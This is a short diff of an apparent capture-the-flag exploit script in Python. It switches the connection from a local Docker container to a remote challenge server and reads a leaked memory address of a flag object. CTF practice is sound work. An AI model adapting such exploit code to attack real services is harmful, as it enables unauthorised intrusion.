@@ -21,7 +21,7 @@ for i in range(50):
     flag_char = ''
     for j in range(7):
         # Connect to localhost Docker container
-        p = remote("localhost", 1337)
+        p = remote("play.h7tex.com", 37327)
         p.recvuntil(b'The flag file object is stored at: ')
         leak = int(p.recvline().strip().decode(), 16)
         # print(hex(leak))
